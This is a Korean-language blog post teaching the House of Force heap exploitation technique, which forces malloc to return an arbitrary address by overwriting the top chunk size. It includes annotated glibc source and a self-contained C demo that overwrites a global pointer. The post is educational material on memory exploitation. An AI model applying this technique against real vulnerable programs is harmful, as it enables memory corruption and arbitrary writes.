---
layout: post
title: "House of Force"
author: "B3LLz"
tags: exploit-tech
excerpt_separator: <!--more-->
---

# House of Force

House of Force attack은 top chunk를 이용한 공격이다.

정확히는 Top chunk의 size를 조작하여 임의의 주소에 힙 청크를 할당시킬 수 있는 공격이다.

# Top Chunk 처리 코드 분석

다음은 `malloc.c` 의 소스코드에서 Top Chunk를 처리하는 `_int_malloc()`의 일부분이다.

```c
victim = av->top;  // top chunk의 주소를 가져옴.
size = chunksize (victim);  // top chunk의 size를 구함.

if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
  {
    remainder_size = size - nb;
    remainder = chunk_at_offset (victim, nb);
    av->top = remainder;
    set_head (victim, nb | PREV_INUSE |
              (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head (remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk (av, victim, nb);
    void *p = chunk2mem (victim);
    alloc_perturb (p, bytes);
    return p;
  }
```

1. Top Chunk의 주소와 크기를 저장한다(`victim = av→top`, `size = chunksize(victim)`).
2. Top Chunk의 크기가  `nb + MINSIZE` (요청받은 Chunk의 크기 + Chunk의 최소 크기)보다 크거나 같은지 검사한다.
3. Top Chunk의 크기`size`에서 `nb`를 빼준 값을 `remainder_size`에 저장한다.
4. `**chunk_at_offset` 매크로를 통해 반환된 값을 `remainder` 에 저장한다. `chunk_at_offset` 매크로는 아래와같이 정의되어 있다.**
    
    ```c
    #define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
    ```
    
    따라서 Top Chunk의 주소 값 `victim`에 `nb`를 더해준 값을 반환한다.
    
5. `remainder`는 다시 Top Chunk(`av→top`)에 저장한다.
6. `set_head`를 통해 Chunk의 header 부분을 setting 해주고 힙 영역에 메모리를 할당한다.

# House of Force Attack Flow

1. `malloc()`으로 힙 영역에 메모리를 할당한다.
    
    ![hof1](/images/hof1.png)
    
2. Top Chunk의 size 값을 `0xffffffff`(32bit)나  `0xffffffffffffffff`(64bit) 값으로 덮어쓴다.
    - 위에서 설명했던 것처럼`_int_malloc`에서 Top Chunk의 크기와 할당을 요청받은 크기를 비교하는 조건문을 참으로 만들어 힙 영역에 메모리를 할당할 수 있게 한다.
    
    ![hof2](/images/hof2.png)
    
3. 원하는 주소를 할당 받기 위해 아래의 값을 `malloc()` 인자로 전달한다.
    
    [`할당 받고자하는 메모리 주소 - Chunk header size - Top Chunk addr - Chunk header size`]
    
    ex) `0x601048 - 0x10 - 0x6024A0 - 0x10 = 0xffffffffffffeb88`
    
    - 계산된 값을 `malloc()`의 인자로 넣어주게 되면 인자로 넣어준 크기만큼 메모리를 할당하게 되는데 위에서 설명한 `chunk_at_offset` 매크로를 통해 Top Chunk의 주소가   `top chunk 주소 + 할당 요청 크기`가 된다.
    
    ![hof3](/images/hof3.png)
    
4. 그리고 다시 한 번 `malloc()`을 호출하면 원하는 주소를 반환한다.
    - 다시 한 번 `malloc()`을 해줌으로써 Target Address에 메모리가 할당된다.
    
    ![hof4](/images/hof4.png)
    

# Example

아래의 코드는 다음과 같은 동작을 하며 Target Address는 `0x601048` 이다.

1. 128byte 크기의 메모리를 할당한다.
2. Top Chunk의 Size를 `0xffffffffffffffff`으로 Overwrite 한다.
3. House of Force 공격을 하기 위해 메모리 할당해줄 크기를 구한다.
    1. `(uint64_t)(&target) - 0x10 - (uint64_t)top_chunk - 0x18`에서 `0x18`인 이유는 Target Address가 `0x601048`로 되어있기 때문에 보다 정확하게 할당해주기 위해서 Target Address의 메타데이터 크기인 `0x10`에서 `0x8`을 더 빼주었다.
    2. 힙은 16byte 단위로 메모리를 할당해주기 때문에 `0x10`만 빼주어도 `0x18`을 빼준 것과 동일한 주소에 할당을 해주지만 정확한 위치에 할당해주기 위함이다.
4. `malloc()`으로 메모리 할당을 한 번 더 해주면 Target Address의 값을 변조할 수 있다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

char* target = "Target!!!";
char* exploit = "EXPL0I7!!!!";

int main(int argc, char* argv[]){
    uint64_t* buf1, *buf2, *buf3;
    uint64_t* top_chunk_size;
    uint64_t* top_chunk;

    printf("==Before House of Force Attack==\n");
    printf("[+] Target ===> %s\n\n", target);
    printf("Target Addr: %p\n\n", &target);

    printf("1. malloc(128)\n");
    buf1 = malloc(128); // Memory Alloc

    top_chunk = &buf1[16];       // Top Chunk Addr
    top_chunk_size = &buf1[17];  // Top Chunk Size Addr

    printf("Top Chunk Addr: %p\n", top_chunk_size);
    printf("Top Chunk Size: 0x%lx\n\n", *top_chunk_size);

    /* Top Chunk Size Overwrite */
    printf("2. OverWrite Top Chunk Size\n");
    *top_chunk_size = 0xffffffffffffffff;
    printf("Top Chunk Addr: %p\n", top_chunk_size);
    printf("Top Chunk Size: 0x%lx\n\n", *top_chunk_size);

    /* Calculate Address to House of Force */
    uint64_t calc = (uint64_t)(&target) - 0x10 - (uint64_t)top_chunk - 0x18;
    printf("3. House of Force!!\n");

    printf("Calc : %lx\n", calc);
    printf("malloc(0x%lx)\n", calc);

    /* House of Force */
    buf2 = malloc(calc);
    printf("[+] buf2 addr: %p\n", buf2);

    /* One More Allocation */
    buf3 = malloc(128);
    printf("[+] buf3 addr: %p\n\n", buf3);

    buf3[1] = (uint64_t)exploit;

    printf("==After House of Force Attack==\n");
    printf("[+] Target ===> %s\n\n", target);

    return 0;
}
```